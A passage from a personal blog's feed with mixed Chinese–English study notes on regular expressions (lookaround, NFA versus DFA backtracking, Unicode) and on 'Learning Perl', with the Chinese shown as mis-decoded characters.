lasso"><span class="hljs-params">...</span><span class="hljs-keyword">by</span> Jeffrey Friedl.<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨<code>(?=Jeffrey)Jeff</code>, å³ä»<code>(?=Jeffrey)</code>ä¸€ä¸ªå­—ç¬¦çš„å³è¾¹æ˜¯<code>Jeffrey</code>çš„ä½ç½®å¼€å§‹åŒ¹é…<code>Jeff</code>. ä¹Ÿå°±æ˜¯ä»<code>by</code>åé¢çš„é‚£ä¸ªç©ºæ ¼å­—ç¬¦å¼€å§‹åŒ¹é….</p><p>ç¯è§†åŒ¹é…çš„å†…å®¹ä¸æ˜¯åŒ¹é…æ–‡æœ¬.</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">s/(?&lt;=\bJeff)(?=s\b)/&#x27;/g<br></code></pre></td></tr></table></figure><p>ç»“åˆéæ•è·å‹æ‹¬å·:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">s/(<span class="hljs-string">?&lt;</span>=\d)(<span class="hljs-string">?=</span>(<span class="hljs-string">?:\d\d\d</span>)+<span class="hljs-variable">$)</span><br></code></pre></td></tr></table></figure><p>Negtive lookahead <code>(?!...)</code> å’Œ negtive lookbehind <code>(?&lt;!...)</code>, å°±æ˜¯æŠŠç­‰å· <code>=</code> æ¢æˆäº† <code>!</code> .</p><p>å½“ their subexpression is not able to match, æˆåŠŸçš„ä½ç½®. å³å‘¨å›´ä¸æ˜¯ä»€ä¹ˆæ—¶åŒ¹é…çš„ä½ç½®.</p><p>å¯ä»¥å¤„ç†ä¸€ä¾§åŒ¹é…ï¼Œä¸€ä¾§ä¸åŒ¹é…çš„æƒ…å†µ.</p><p>Using <code>(?&lt;!\w)(?=\w)|(?&lt;=\w)(?!\w)</code> as a replacement for <code>\b</code>.</p><h3 id="Commafication-without-lookbehind"><a href="#Commafication-without-lookbehind" class="headerlink" title="Commafication without lookbehind"></a>Commafication without lookbehind</h3><p>æ³¨æ„ Lookbehind is not as widely supported as lookahead.</p><h2 id="Text-to-HTML-è½¬æ¢"><a href="#Text-to-HTML-è½¬æ¢" class="headerlink" title="Text-to-HTML è½¬æ¢"></a>Text-to-HTML è½¬æ¢</h2><h1 id="3-Overview-of-Regular-Expression-Features-and-Flavors"><a href="#3-Overview-of-Regular-Expression-Features-and-Flavors" class="headerlink" title="3 Overview of Regular Expression Features and Flavors"></a>3 Overview of Regular Expression Features and Flavors</h1><p>â€œGlobal Regular Expression Printâ€ å³ grep.</p><p>egrep å³ â€œextend grepâ€.</p><h2 id="POSIX-æ ‡å‡†åŒ–çš„å°è¯•"><a href="#POSIX-æ ‡å‡†åŒ–çš„å°è¯•" class="headerlink" title="POSIX æ ‡å‡†åŒ–çš„å°è¯•"></a>POSIX æ ‡å‡†åŒ–çš„å°è¯•</h2><p>POSIX æŠŠå¸¸è§çš„æµæ´¾åˆ†ä¸ºä¸¤å¤§ç±»:</p><pre><code class="hljs">1. Basic Regular Expresion (BREs)2. Extended Regular Expresion (EREs)</code></pre><p><code>PCRE</code> æ­£åˆ™è¡¨è¾¾å¼åº“ã€‚</p><h2 id="å­—ç¬¦ä¸²ï¼Œ-å­—ç¬¦ç¼–ç å’ŒåŒ¹é…æ¨¡å¼"><a href="#å­—ç¬¦ä¸²ï¼Œ-å­—ç¬¦ç¼–ç å’ŒåŒ¹é…æ¨¡å¼" class="headerlink" title="å­—ç¬¦ä¸²ï¼Œ å­—ç¬¦ç¼–ç å’ŒåŒ¹é…æ¨¡å¼"></a>å­—ç¬¦ä¸²ï¼Œ å­—ç¬¦ç¼–ç å’ŒåŒ¹é…æ¨¡å¼</h2><h3 id="ä½œä¸ºæ­£åˆ™è¡¨è¾¾å¼çš„å­—ç¬¦ä¸²"><a href="#ä½œä¸ºæ­£åˆ™è¡¨è¾¾å¼çš„å­—ç¬¦ä¸²" class="headerlink" title="ä½œä¸ºæ­£åˆ™è¡¨è¾¾å¼çš„å­—ç¬¦ä¸²"></a>ä½œä¸ºæ­£åˆ™è¡¨è¾¾å¼çš„å­—ç¬¦ä¸²</h3><p>é™¤äº† Perl, awk, sed ä¹‹å¤–çš„å¤§å¤šæ•°è¯­è¨€çš„æ­£åˆ™å¼•æ“æ¥æ”¶çš„æ˜¯ä»¥æ™®é€šå­—ç¬¦ä¸²å½¢å¼æä¾›çš„æ­£åˆ™è¡¨è¾¾å¼.</p><p>åœ¨å­—ç¬¦ä¸²æ–‡å­—ä¸­ï¼Œå¿…é¡»ä½¿ç”¨ä¸¤ä¸ªç´§æŒ¨åœ¨ä¸€èµ·çš„åæ–œçº¿æ‰èƒ½è¡¨ç¤ºæ­£åˆ™è¡¨è¾¾å¼ä¸­çš„åæ–œçº¿ã€‚å¦‚ä¸ºäº†è¡¨ç¤ºæ­£åˆ™è¡¨è¾¾å¼ä¸­çš„<code>\n</code>, å¿…é¡»åœ¨å­—ç¬¦ä¸²ä¸­ä½¿ç”¨<code>\\n</code>.</p><p>å¤„ç†åˆ†ä¸ºäº†ä¸¤éƒ¨åˆ†ï¼Œè¯­è¨€çš„å­—ç¬¦ä¸²å¤„ç†å’Œæ­£åˆ™å¼•æ“å¤„ç†.</p><h3 id="å­—ç¬¦ç¼–ç "><a href="#å­—ç¬¦ç¼–ç " class="headerlink" title="å­—ç¬¦ç¼–ç "></a>å­—ç¬¦ç¼–ç </h3><p>è§„å®šäº†ä¸åŒæ•°å€¼çš„å­—èŠ‚åº”è¯¥å¦‚ä½•è§£é‡Š.</p><h4 id="Unicode"><a href="#Unicode" class="headerlink" title="Unicode"></a>Unicode</h4><p>Itâ€™s a logical mapping between a number and a character.</p><p>è¿™é‡Œçš„ number ç§°ä¸º code point å¸¸ä¸º hexadecimal åŠ ä¸Šâ€œU+â€ åœ¨å‰é¢. å¦‚<code>U+c0B5</code>.</p><h5 id="Characters-versus-combining-character-sequences"><a href="#Characters-versus-combining-character-sequences" class="headerlink" title="Characters versus combining-character sequences"></a>Characters versus combining-character sequences</h5><p>ä¸€ä¸ªå­—ç¬¦ï¼Œå¯èƒ½ç”±ä¸¤ä¸ª code point æ¥è¡¨ç¤º. ä¸€ä¸ª base character, ä¸€ä¸ª combining character.</p><p>Unicode offers  a number of combining characters that are intended to follow a base character.</p><p>ä¸¤ä¸ªä»£ç ç‚¹çš„å­—ç¬¦åé¢è·Ÿä¸€ä¸ªé‡è¯ï¼Œé‡è¯å¯èƒ½ä½œç”¨ä¸ç¬¬äºŒä¸ªä»£ç ç‚¹.</p><h1 id="4-The-Mechanics-of-Expression-Processing"><a href="#4-The-Mechanics-of-Expression-Processing" class="headerlink" title="4 The Mechanics of Expression Processing"></a>4 The Mechanics of Expression Processing</h1><h2 id="Regex-Engine-Types"><a href="#Regex-Engine-Types" class="headerlink" title="Regex Engine Types"></a>Regex Engine Types</h2><p>åˆ†ä¸ºä¸¤ç±»:<br>    1. DFA<br>    2. NFA</p><p>æµ‹è¯•äº†ä¸€ä¸‹ï¼ŒVimä½¿ç”¨çš„æ˜¯ä¼ ç»Ÿå‹NFA. egrep æ˜¯DFAã€‚</p><p>Two all-encompassing rules:<br>    1. The match that begins earliest (leftmost) wins.<br>    2. The standard quantifiers (*, +, ?, and {m,n}) are greedy.</p><p>å¦‚æœä¸èƒ½åœ¨æœ€å¼€å§‹çš„ä½ç½®åŒ¹é…æˆåŠŸï¼Œå°±ä¼šä»å­—ç¬¦ä¸²ä¸‹ä¸€ä¸ªä½ç½®é‡æ–°å¼€å§‹åŒ¹é….</p><p>Backreference åªå¯¹NFAå¼•æ“æœ‰æ•ˆ.</p><p>DFAå¼•æ“åŒ¹é…é€Ÿåº¦æ›´å¿«ã€‚</p><h2 id="Regex-Directed-Versus-Text-Directed"><a href="#Regex-Directed-Versus-Text-Directed" class="headerlink" title="Regex-Directed Versus Text-Directed"></a>Regex-Directed Versus Text-Directed</h2><p>The two basic engine types åæ˜ äº†ç®—æ³•çš„å·®å¼‚.</p><p>NFA engine â€œregex-directedâ€.</p><p>DFA engine â€œtext-directedâ€.</p><h3 id="First-Thoughts-NFA-and-DFA-in-Comparison"><a href="#First-Thoughts-NFA-and-DFA-in-Comparison" class="headerlink" title="First Thoughts: NFA and DFA in Comparison"></a>First Thoughts: NFA and DFA in Comparison</h3><p>NFA, Nondeterministic Finite Automaton, å­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦å¯èƒ½ä¼šåŒ¹é…å¤šæ¬¡ã€‚</p><p>DFA, Deterministic Finite Automaton, å­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦åªä¼šåŒ¹é…ä¸€æ¬¡.</p><p>ä¸åŒçš„è¡¨è¾¾å¼ä¼šä»¥ä¸åŒçš„æ–¹å¼æ§åˆ¶å¼•æ“.</p><p>DFA keeps track of all matches simultaneously.</p><h3 id="Backtracking"><a href="#Backtracking" class="headerlink" title="Backtracking"></a>Backtracking</h3><p>Itâ€™s the essence of an NFA engine. åœ¨é¢ä¸´ä½œå‡ºé€‰æ‹©çš„æƒ…å½¢æ˜¯ä¼šè®°ä½æœªé€‰çš„ç»“æ„. å¦‚é‡è¯å’Œå¤šé€‰ç»“æ„(|).</p><h4 id="Two-Important-Points-on-Backtracking"><a href="#Two-Important-Points-on-Backtracking" class="headerlink" title="Two Important Points on Backtracking"></a>Two Important Points on Backtracking</h4><p>   1.The engine always choose to first make the attempt for greedy quantifiers, and to first skip the attempt for lazy ones. å½“é‡è¯æ˜¯greedyæ—¶ï¼Œä¼šå°è¯•åŒ¹é…ï¼Œæ˜¯lazyæ—¶ä¼šè·³è¿‡.<br>   2.The most recently saved option is the one returned to when a local failure forces backtracking. Theyâ€™re used LIFO(last in first out).</p><h3 id="Saved-State"><a href="#Saved-State" class="headerlink" title="Saved State"></a>Saved State</h3><p>This is the basis for NFA matching.</p><p>greedy é‡è¯å’Œ lazy é‡è¯çš„ä¿å­˜çŠ¶æ€ä¸åŒ. å‰è€…åœ¨é‡è¯ä½œç”¨çš„patternåé¢ï¼Œåè€…åœ¨å‰é¢.</p><h3 id="Backtracking-and-Greediness"><a href="#Backtracking-and-Greediness" class="headerlink" title="Backtracking and Greediness"></a>Backtracking and Greediness</h3><h4 id="Star-plus-and-their-backtracking"><a href="#Star-plus-and-their-backtracking" class="headerlink" title="Star, plus, and their backtracking"></a>Star, plus, and their backtracking</h4><p>æ¯æµ‹è¯•ä¸€é¡¹éƒ½ä¼šä¿ç•™ä¸€ä¸ªçŠ¶æ€.</p><p>éœ€æ³¨æ„:<br>    1. Backtracking æœºåˆ¶ä¸ä½†éœ€è¦é‡æ–°è®¡ç®—æ­£åˆ™è¡¨è¾¾å¼å’Œæ–‡æœ¬çš„å¯¹åº”ä½ç½®ï¼Œä¹Ÿéœ€è¦ç»´æŠ¤æ‹¬å·å†…çš„å­è¡¨è¾¾å¼æ‰€åŒ¹é…çš„æ–‡æœ¬çŠ¶æ€.<br>    2. æ˜Ÿå·(æˆ–å…¶ä»–äººå’Œgreedyé‡è¯)é™å®šçš„éƒ¨åˆ†ä¸å—åé¢å…ƒç´ çš„å½±å“ï¼Œè€Œæ˜¯åŒ¹é…å°½å¯èƒ½å¤šçš„å†…å®¹.</p><p>DFA åªæœ‰ greedy çš„é‡è¯.</p><h3 id="Problem-of-Greediness"><a href="#Problem-of-Greediness" class="headerlink" title="Problem of Greediness"></a>Problem of Greediness</h3><p>ä¸è¦è¿‡åˆ†ä¾èµ–<code>.*</code>, å¯èƒ½ä¼šå‡ºé—®é¢˜.</p><p>å¿½ç•¥é‡è¯æœ‰æ—¶å¯ä»¥æ›¿ä»£æ’é™¤ç±».</p><p>ä½¿ç”¨æ’é™¤ç¯è§†ï¼Œå¯ä»¥å¾—åˆ°ä¸æ’é™¤å‹å­—ç¬¦ç»„ç›¸å½“çš„ç»“æœ.</p><h3 id="The-Essence-of-Greediness-Laziness-and-Backtracing"><a href="#The-Essence-of-Greediness-Laziness-and-Backtracing" class="headerlink" title="The Essence of Greediness, Laziness, and Backtracing"></a>The Essence of Greediness, Laziness, and Backtracing</h3><p>åœ¨åŒ¹é…å¤±è´¥åï¼Œå°±ä¼šå°è¯•å¦å¤–çš„åˆ†æ”¯.</p><p>æ— è®ºæ˜¯åŒ¹é…ä¼˜å…ˆè¿˜æ˜¯å¿½ç•¥ä¼˜å…ˆï¼Œåªè¦å¼•æ“æŠ¥å‘ŠåŒ¹é…å¤±è´¥ï¼Œå®ƒå°±å¿…ç„¶å°è¯•äº†æ‰€æœ‰çš„å¯èƒ½.</p><p>åŒ¹é…ä¼˜å…ˆå’Œå¿½ç•¥ä¼˜å…ˆåŒºåˆ«äºæµ‹è¯•è·¯å¾„çš„å…ˆåé¡ºåºã€‚</p><h3 id="Possessive-Quantifiers-and-Atomic-Grouping"><a href="#Possessive-Quantifiers-and-Atomic-Grouping" class="headerlink" title="Possessive Quantifiers and Atomic Grouping"></a>Possessive Quantifiers and Atomic Grouping</h3><h4 id="Atomic-grouping-with-gt-â€¦"><a href="#Atomic-grouping-with-gt-â€¦" class="headerlink" title="Atomic grouping with (?&gt;â€¦)"></a>Atomic grouping with (?&gt;â€¦)</h4><p>Atomic grouping å³æ”¾å¼ƒå…¶ä¸­çš„ saved state. </p><h4 id="The-essence-of-atomic-grouping"><a href="#The-essence-of-atomic-grouping" class="headerlink" title="The essence of atomic grouping"></a>The essence of atomic grouping</h4><p>åŒ¹é…ä¼˜å…ˆå’Œå¿½ç•¥ä¼˜å…ˆéƒ½ä¸ä¼šå½±å“éœ€è¦æ£€æµ‹è·¯å¾„çš„æœ¬èº«ï¼Œè€Œåªä¼šå½±å“æ£€æµ‹çš„é¡ºåºã€‚å¦‚æœä¸èƒ½åŒ¹é…ï¼Œæ— è®ºæ˜¯åŒ¹é…ä¼˜å…ˆè¿˜æ˜¯å¿½ç•¥ä¼˜å…ˆçš„é¡ºåºï¼Œæœ€ç»ˆæ¯æ¡è·¯å¾„éƒ½ä¼šè¢«æµ‹è¯•.</p><h4 id="Possessive-Quantifiers-and-m-n"><a href="#Possessive-Quantifiers-and-m-n" class="headerlink" title="Possessive Quantifiers, ?+, *+, ++, and {m,n}+"></a>Possessive Quantifiers, <code>?+, *+, ++, and &#123;m,n&#125;+</code></h4><p>Possessive quantifiers are much like greedy quantifiers ä½†æ˜¯å®ƒä»¬ä»ä¸äº¤è¿˜å·²ç»åŒ¹é…çš„å­—ç¬¦.</p><p>æ¯å½“åšé€‰æ‹©æ—¶éƒ½ä¼šåˆ›å»º saved state.</p><p>Possessive quantifiers ä¸ä¼šåˆ›å»º saved state.</p><h3 id="The-Backtracking-of-Lookaround"><a href="#The-Backtracking-of-Lookaround" class="headerlink" title="The Backtracking of Lookaround"></a>The Backtracking of Lookaround</h3><p>Lookaround is closely related to atomic grouping and possessive quantifiers.</p><p>There are four types of lookaround:</p><pre><code class="hljs">1. positive2. negetive   flavors of lookahead and lookbehind</code></pre><p>åœ¨NFAçš„ä¸–ç•Œä¸­åŒ…å«äº† saved state å’Œ backtracking.</p><p>åªè¦ç¯è§†ç»“æ„çš„åŒ¹é…å°è¯•ç»“æŸï¼Œå®ƒå°±ä¸ä¼šç•™ä¸‹ä»»ä½• saved state.</p><h3 id="Is-Alternation-Greedy"><a href="#Is-Alternation-Greedy" class="headerlink" title="Is Alternation Greedy"></a>Is Alternation Greedy</h3><p>å¤šé€‰ç»“æ„æ˜¯æŒ‰é¡ºåºæ’åˆ—çš„ã€‚</p><p>å¦‚æœå¤šé€‰åˆ†æ”¯æ˜¯æœ‰åºçš„ï¼Œè€Œèƒ½å¤ŸåŒ¹é…åŒæ ·æ–‡æœ¬çš„å¤šé€‰åˆ†æ”¯åˆä¸æ­¢ä¸€ä¸ªï¼Œå°±è¦å°å¿ƒå®‰æ’å¤šé€‰åˆ†æ”¯çš„å…ˆåé¡ºåº.</p><p>åŒ¹é…æ—¥æœŸæ—¶çš„æ‹†åˆ†æ–¹æ³•.</p><h2 id="NFA-DFA-and-POSIX"><a href="#NFA-DFA-and-POSIX" class="headerlink" title="NFA, DFA and POSIX"></a>NFA, DFA and POSIX</h2><h3 id="The-Longest-Leftmost"><a href="#The-Longest-Leftmost" class="headerlink" title="The Longest-Leftmost"></a>The Longest-Leftmost</h3><h3 id="POSIX-and-the-Longest-Leftmost-Rule"><a href="#POSIX-and-the-Longest-Leftmost-Rule" class="headerlink" title="POSIX and the Longest-Leftmost Rule"></a>POSIX and the Longest-Leftmost Rule</h3><p>POSIXæ ‡å‡†è§„å®šï¼Œå¦‚æœåœ¨å­—ç¬¦ä¸²çš„æŸä¸ªä½ç½®å­˜åœ¨å¤šä¸ªå¯èƒ½çš„åŒ¹é…ï¼Œåº”å½“è¿”å›çš„æ˜¯æœ€é•¿çš„åŒ¹é….</p><h2 id="Summary-NFA-and-DFA-in-Comparison"><a href="#Summary-NFA-and-DFA-in-Comparison" class="headerlink" title="Summary: NFA and DFA in Comparison"></a>Summary: NFA and DFA in Comparison</h2><h3 id="DFA-versus-NFA-Differences-in-the-pre-use-compile"><a href="#DFA-versus-NFA-Differences-in-the-pre-use-compile" class="headerlink" title="DFA versus NFA: Differences in the pre-use compile"></a>DFA versus NFA: Differences in the pre-use compile</h3><p>NFA çš„ç¼–è¯‘è¿‡ç¨‹é€šå¸¸1è¦å¿«ä¸€äº›ï¼Œéœ€è¦çš„å†…å­˜ä¹Ÿæ›´å°‘ä¸€äº›.</p><h3 id="DFA-versus-NFA-Differences-in-match-speed"><a href="#DFA-versus-NFA-Differences-in-match-speed" class="headerlink" title="DFA versus NFA: Differences in match speed"></a>DFA versus NFA: Differences in match speed</h3><p>ä¸€èˆ¬æ¥è¯´ï¼ŒDFA çš„é€Ÿåº¦å’Œæ­£åˆ™è¡¨è¾¾å¼æ— å…³ï¼Œè€ŒNFA ä¸­ä¸¤è€…ç›´æ¥å…³è”.</p><h3 id="DFA-versus-NFA-Differences-in-what-is-matched"><a href="#DFA-versus-NFA-Differences-in-what-is-matched" class="headerlink" title="DFA versus NFA: Differences in what is matched"></a>DFA versus NFA: Differences in what is matched</h3><p>DFA(æˆ–è€…POSIX NFA) è¿”å›æœ€å·¦è¾¹çš„æœ€é•¿çš„åŒ¹é…æ–‡æœ¬. ä¼ ç»Ÿå‹NFA å¯èƒ½è¿”å›åŒæ ·çš„ç»“æœï¼Œå½“ç„¶ä¹Ÿå¯èƒ½æ˜¯åˆ«çš„æ–‡æœ¬.</p><h3 id="DFA-versus-NFA-Differences-in-capabilities"><a href="#DFA-versus-NFA-Differences-in-capabilities" class="headerlink" title="DFA versus NFA: Differences in capabilities"></a>DFA versus NFA: Differences in capabilities</h3><p>NFA èƒ½æä¾›ä¸€äº› DFA ä¸æ”¯æŒçš„åŠŸèƒ½.</p><h3 id="DFA-versus-NFA-Differences-in-ease-of-implementation"><a href="#DFA-versus-NFA-Differences-in-ease-of-implementation" class="headerlink" title="DFA versus NFA: Differences in ease of implementation"></a>DFA versus NFA: Differences in ease of implementation</h3><p>The soul of NFA matching is backtracking.</p>]]></content>
    
    
    <categories>
      
      <category>Regex</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>åˆ»æ„ç»ƒä¹ ç¬”è®°</title>
    <link href="/2022/07/05/%E5%88%BB%E6%84%8F%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/07/05/%E5%88%BB%E6%84%8F%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="å¿ƒç†è¡¨å¾"><a href="#å¿ƒç†è¡¨å¾" class="headerlink" title="å¿ƒç†è¡¨å¾"></a>å¿ƒç†è¡¨å¾</h2><p>å¿ƒç†è¡¨å¾æ˜¯ä¸€ç§ä¸æˆ‘ä»¬å¤§è„‘æ­£åœ¨æ€è€ƒçš„æŸä¸ªç‰©ä½“ã€æŸä¸ªè§‚ç‚¹ã€æŸäº›ä¿¡æ¯æˆ–è€…å…¶ä»–ä»»ä½•äº‹ç‰©ç›¸å¯¹åº”çš„å¿ƒç†ç»“æ„ï¼Œæˆ–å…·ä½“æˆ–æŠ½è±¡ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Books</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Learning Perl Notes</title>
    <link href="/2022/07/04/Learning-Perl-Notes/"/>
    <url>/2022/07/04/Learning-Perl-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="2022-x2F-5-x2F-25"><a href="#2022-x2F-5-x2F-25" class="headerlink" title="2022&#x2F;5&#x2F;25"></a>2022&#x2F;5&#x2F;25</h1><h2 id="page-21-29"><a href="#page-21-29" class="headerlink" title="page 21~29"></a>page 21~29</h2><p>Perl ç¨‹åºå¹¶ä¸éœ€è¦ç”¨ä»€ä¹ˆç‰¹æ®Šçš„æ–‡ä»¶åæˆ–æ‰©å±•åï¼Œç”šè‡³ä¸ç”¨æ‰©å±•åå°±æœ€å¥½ä¸è¦ç”¨ã€‚</p><p>Perl æ€»æ˜¯å°†ç‰ˆæœ¬å·çœ‹ä½œæ˜¯ä¸‰ä½æ•°è¡¨ç¤ºçš„ï¼Œå¦‚<code>use 5.010</code></p><p>Perl çš„æ³¨é‡Šæ˜¯ä»äº•å·(#)å¼€å§‹åˆ°è¡Œå°¾ç»“æŸã€‚</p><p>å¥½å¤šPerlç¨‹åºå¯èƒ½æ ¹æœ¬ä¸ç”¨å­ç¨‹åºã€‚</p><p>Perlç¨‹åºå¹¶ä¸éœ€è¦å˜é‡å£°æ˜çš„éƒ¨åˆ†ã€‚</p><p>æ¢è¡Œç¬¦\n(newline character).</p><p>åˆ†å·çš„ç›®çš„æ˜¯åˆ†éš”ä¸åŒçš„Perlè¯­å¥ï¼Œè€Œä¸æ˜¯æ–­è¡Œã€‚</p><p>è®©åç»­è°ƒç”¨è·³è¿‡ç¼–è¯‘ï¼Œå°†ç¨‹åºä»£ç ç¼–è¯‘åé©»ç•™åˆ°å†…å­˜ä¸­ã€‚</p><p>perldocå‘½ä»¤ï¼Œç”¨æ¥é˜…è¯»PerlåŠå…¶ç›¸å…³æ‰©å±•å’Œå·¥å…·ç¨‹åºçš„è¯´æ˜æ–‡æ¡£ã€‚</p><h2 id="ç¬¬äºŒç« "><a href="#ç¬¬äºŒç« " class="headerlink" title="ç¬¬äºŒç« "></a>ç¬¬äºŒç« </h2><h3 id="p30ï½33"><a href="#p30ï½33" class="headerlink" title="p30ï½33"></a>p30ï½33</h3><p>Perlå†…éƒ¨ï¼Œæ€»æ˜¯æŒ‰â€œåŒç²¾åº¦æµ®ç‚¹æ•°â€çš„è¦æ±‚ä¿å­˜æ•°å­—å¹¶è¿›è¡Œè¿ç®—çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼ŒPerlå†…éƒ¨å¹¶ä¸å­˜åœ¨æ•´æ•°å€¼ã€‚</p><p>IEEE-745æ ¼å¼ä¸­ï¼ŒåŒç²¾åº¦èƒ½è¡¨ç¤º15ä½çš„ç²¾åº¦ã€‚</p><p>Perlå…è®¸åœ¨æ•´æ•°ç›´æ¥é‡ä¸­æ’å…¥ä¸‹åˆ’çº¿ï¼Œå°†è‹¥å¹²ä½æ•°åˆ†å¼€ã€‚å¦‚<code>61_298_040_283_768</code><br>ä¸ºäº†é¿å…æ­§ä¹‰ï¼Œæ²¡æœ‰ä½¿ç”¨é€—å·ã€‚</p><p>å…«è¿›åˆ¶0å¼€å¤´ï¼Œåå…­è¿›åˆ¶0xå¼€å¤´ï¼ŒäºŒè¿›åˆ¶0bå¼€å¤´ã€‚</p><p>åŒæ˜Ÿå·è¡¨ç¤ºä¹˜å¹‚: <code>2**3</code> è¡¨ç¤º2çš„3æ¬¡æ–¹ã€‚</p><p>ç©ºå­—ç¬¦åœ¨Perlä¸­æ²¡æœ‰ç‰¹æ®Šæ„ä¹‰ã€‚</p><p>Perlä¸­å­—ç¬¦ä¸²çš„é•¿åº¦æ²¡æœ‰é™åˆ¶ã€‚</p><p>Perlå®Œå…¨æ”¯æŒUnicodeã€‚</p><p>æƒ³è¦åœ¨æºä»£ç ä¸­ä½¿ç”¨Unicodeä¹¦å†™ç›´æ¥é‡çš„è¯ï¼Œéœ€è¦æ‰‹å·¥åŠ ä¸Šutf8ç¼–è¯‘æŒ‡ä»¤ <code>use utf8;</code> .</p><h2 id="é™„å½•C-Unicodeå…¥é—¨"><a href="#é™„å½•C-Unicodeå…¥é—¨" class="headerlink" title="é™„å½•C Unicodeå…¥é—¨"></a>é™„å½•C Unicodeå…¥é—¨</h2><p>Unicodeå­—ç¬¦é›†(Unicode Character Set).æ˜¯å­—ç¬¦(character)åˆ°ä»£ç ç‚¹(code point)çš„æŠ½è±¡å…³ç³»æ˜ å°„ã€‚</p><p>å¯ä»¥ä¸ç”¨è€ƒè™‘æ“ä½œç³»ç»Ÿçš„åŒºåˆ«ã€‚</p><hr><h2 id="æŸ¥è¯¢çš„èµ„æ–™"><a href="#æŸ¥è¯¢çš„èµ„æ–™" class="headerlink" title="æŸ¥è¯¢çš„èµ„æ–™"></a>æŸ¥è¯¢çš„èµ„æ–™</h2><hr><p><a href="https://blog.csdn.net/hezh1994/article/details/78899683?utm_source=app&app_version=5.4.0">å‚è€ƒ1</a><br><a href="https://blog.csdn.net/u010411264/article/details/45258629?utm_source=app&app_version=5.4.0">å‚è€ƒ2</a></p><hr><h3 id="ä»£ç ç‚¹"><a href="#ä»£ç ç‚¹" class="headerlink" title="ä»£ç ç‚¹"></a>ä»£ç ç‚¹</h3><p>code pointï¼ŒæŒ‡ä¸€ä¸ªç¼–ç è¡¨ä¸­çš„æŸä¸ªå­—ç¬¦å¯¹åº”çš„ä»£ç å€¼ï¼Œä¹Ÿå°±æ˜¯Unicodeç¼–ç è¡¨ä¸­æ¯ä¸ªå­—ç¬¦å¯¹åº”çš„æ•°å€¼ï¼ŒUnicodeä¸­ï¼Œä»£ç ç‚¹ç”¨åå…­è¿›åˆ¶ä¹¦å†™ï¼Œå¹¶åŠ ä¸ŠU+å‰ç¼€ï¼Œå¦‚å­—ç¬¦Aå¯¹åº”çš„ç¼–ç å€¼æ˜¯<code>U+0041</code>.</p><h3 id="ASCIIç "><a href="#ASCIIç " class="headerlink" title="ASCIIç "></a>ASCIIç </h3><p>ç”¨ä¸€ä¸ªå­—èŠ‚è¡¨ç¤ºå­—ç¬¦ï¼Œä¸€ä¸ªå­—èŠ‚æœ‰å…«ä½256ç§çŠ¶æ€ã€‚</p><p>ä¸€å…±å®šä¹‰äº†128ä¸ªå­—ç¬¦ï¼Œåªæ˜¯ç”¨äº†ä¸€å­—èŠ‚çš„åä¸ƒä½ï¼Œæœ€å‰é¢ä¸€ä½ç»Ÿä¸€è§„å®šä¸º0.</p><h3 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h3><p>128ä¸ªå­—ç¬¦æ— æ³•è¡¨ç¤ºå®Œå…¶ä»–è¯­è¨€ã€‚</p><h3 id="Unicodeå‡ºç°"><a href="#Unicodeå‡ºç°" class="headerlink" title="Unicodeå‡ºç°"></a>Unicodeå‡ºç°</h3><p>æä¾›ä¸€ç§æ ‡å‡†æ–¹æ¡ˆæ¥å±•ç¤ºä¸–ç•Œä¸Šæ‰€æœ‰è¯­è¨€ä¸­çš„æ‰€æœ‰å­—ç¬¦ã€‚</p><p>Unicodeåªæ˜¯ä¸€ä¸ªå­—ç¬¦é›†ï¼Œæ²¡æœ‰è§„å®šå­—ç¬¦å¯¹åº”çš„äºŒè¿›åˆ¶ç å¦‚ä½•å­˜å‚¨ã€‚è¿™æ ·å¯¼è‡´çš„é—®é¢˜æ˜¯ï¼Œä¸çŸ¥é“ç”¨2ä¸ªå­—èŠ‚è¡¨ç¤ºçš„æ˜¯ä¸€ä¸ªå­—ç¬¦è¿˜æ˜¯ä¸¤ä¸ªå­—ç¬¦ã€‚</p><p>ä¸ºäº†è§£å†³Unicodeçš„ç¼–ç é—®é¢˜ï¼Œè¯ç”Ÿäº†UTF-8(å˜é•¿ç¼–ç )å’ŒUTF-16ï¼Œè¿˜æœ‰UTF-32(å®šé•¿ç¼–ç )ï¼Œå®ƒä»¬éƒ½æ˜¯ç¼–ç æ–¹å¼ã€‚</p><h3 id="UTF-8"><a href="#UTF-8" class="headerlink" title="UTF-8"></a>UTF-8</h3><p>å®ç°äº†å¯¹ASCIIç çš„å‘åå…¼å®¹ã€‚</p><p>UTF-8æ˜¯ä½¿ç”¨æœ€å¹¿æ³›çš„ä¸€ç§Unicodeç¼–ç æ–¹å¼ã€‚</p><p>æœ€å¤§ç‰¹ç‚¹æ˜¯å¯å˜é•¿ã€‚æ ¹æ®å­—ç¬¦çš„ä¸åŒå˜æ¢é•¿åº¦ã€‚</p><p>ç¼–ç è§„åˆ™ï¼š<br>    1. å¯¹äºå•ä¸ªå­—èŠ‚çš„å­—ç¬¦ï¼Œç¬¬ä¸€ä½è®¾ä¸º 0ï¼Œåé¢çš„ 7 ä½å¯¹åº”è¿™ä¸ªå­—ç¬¦çš„ Unicode ç ç‚¹ã€‚å› æ­¤ï¼Œå¯¹äºè‹±æ–‡ä¸­çš„ 0 - 127 å·å­—ç¬¦ï¼Œä¸ ASCII ç å®Œå…¨ç›¸åŒã€‚è¿™æ„å‘³ç€ ASCII ç é‚£ä¸ªå¹´ä»£çš„æ–‡æ¡£ç”¨ UTF-8 ç¼–ç æ‰“å¼€å®Œå…¨æ²¡æœ‰é—®é¢˜ã€‚<br>    2. å¯¹äºéœ€è¦ä½¿ç”¨ N 